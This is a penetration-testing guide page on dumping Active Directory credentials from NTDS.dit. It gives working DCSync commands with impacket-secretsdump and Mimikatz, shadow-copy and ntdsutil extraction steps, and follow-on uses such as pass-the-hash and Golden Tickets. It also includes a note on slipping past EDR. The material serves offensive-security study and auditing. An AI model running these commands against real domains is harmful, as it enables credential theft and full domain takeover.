---
title: "Attacking Active Directory and NTDS.dit"
description: "Extracting all domain hashes from NTDS.dit using ntdsutil, secretsdump, and volume shadow copies."
tags:
  - password-attacks
  - ntds.dit
  - active-directory
  - domain-controller
  - dcsync
icon: material/database-lock
---

# 🏛️ Attacking Active Directory and NTDS.dit

If you compromise an Active Directory Domain Controller (DC) or obtain Domain Admin privileges, the ultimate goal for credential harvesting is extracting the **NTDS.dit** file.

`NTDS.dit` is the primary database file for Active Directory. It contains **all domain users, groups, and their corresponding password hashes (NTLM hashes)**. Extracting this file is often called "dumping the domain."

---

## 1️⃣ Understanding the Constraints

Just like the SAM file on a local machine, `NTDS.dit` is locked by the operating system while the Domain Controller is running. You cannot simply `copy C:\Windows\NTDS\ntds.dit`.

Furthermore, the hashes inside `NTDS.dit` are encrypted. To decrypt them, you must also extract the `SYSTEM` registry hive from the Domain Controller, which contains the boot key required for decryption.

---

## 2️⃣ Method 1: DCSync Attack (Over the Network)

The stealthiest and most modern way to extract hashes from Active Directory is the **DCSync** attack.

In AD, Domain Controllers constantly synchronize replication data with each other using the Directory Replication Service (DRS) Remote Protocol. The DCSync attack impersonates a Domain Controller and asks the targeted DC to replicate user credentials to the attacker's machine.

**Requirements:** You must have an account with the `Replicating Directory Changes` and `Replicating Directory Changes All` privileges (e.g., Domain Admin, Enterprise Admin, or a specially delegated service account).

### Using Impacket's secretsdump.py
```bash
# Extract the hash for a specific user (e.g., krbtgt)
impacket-secretsdump corp.local/admin:Password123@10.10.10.10 -just-dc-user krbtgt

# Extract ALL hashes from the domain
impacket-secretsdump corp.local/admin:Password123@10.10.10.10 -just-dc
```

### Using Mimikatz
```cmd
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

!!! tip
    DCSync is preferred because it requires **no code execution** on the Domain Controller itself. It simply abuses legitimate network protocols.

---

## 3️⃣ Method 2: Volume Shadow Copies (On-Target)

If DCSync is heavily monitored or restricted, and you have a shell on the Domain Controller (e.g., via WinRM or RDP), you can use the Volume Shadow Copy Service (VSS) to copy the locked `ntds.dit` file.

### Step 1: Create a Shadow Copy
```cmd
C:\> vssadmin create shadow /for=C:
# Output: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

### Step 2: Copy NTDS.dit and SYSTEM
```cmd
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
C:\> reg save HKLM\SYSTEM C:\temp\system.save
```

### Step 3: Parse Offline
Exfiltrate both files to your attacker machine and use `secretsdump.py` offline:
```bash
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```

---

## 4️⃣ Method 3: NTDSUTIL (On-Target)

`ntdsutil.exe` is a legitimate, built-in administrative tool used for managing Active Directory databases. Because it is a signed Microsoft binary, it can sometimes bypass basic EDR monitoring.

It includes an "Install from Media" (IFM) feature that automatically generates a snapshot of `ntds.dit` and the required registry hives.

### Creating the IFM Snapshot
```cmd
C:\> ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds_dump" q q
```

This command will create a folder at `c:\temp\ntds_dump` containing:
- `Active Directory\ntds.dit`
- `registry\SYSTEM`
- `registry\SECURITY`

Exfiltrate these files and parse them offline with `secretsdump.py`.

---

## 5️⃣ What to Do With the Dump

A full NTDS.dit dump provides incredible leverage:

1. **Pass the Hash:** You now have the NT hash of every user in the domain. You can authenticate as any user (including the CEO, IT Helpdesk, etc.) using PtH.
2. **Offline Cracking:** You can run Hashcat against all the hashes to identify weak passwords and audit the organization's password policy.
3. **Golden Ticket:** The dump includes the hash for the `krbtgt` account, which allows you to forge Kerberos Golden Tickets for ultimate domain persistence.

---

!!! warning
    **Dumping NTDS.dit grants complete control over the Active Directory environment. Protect exfiltrated dumps with extreme care, as they contain the keys to the kingdom.**
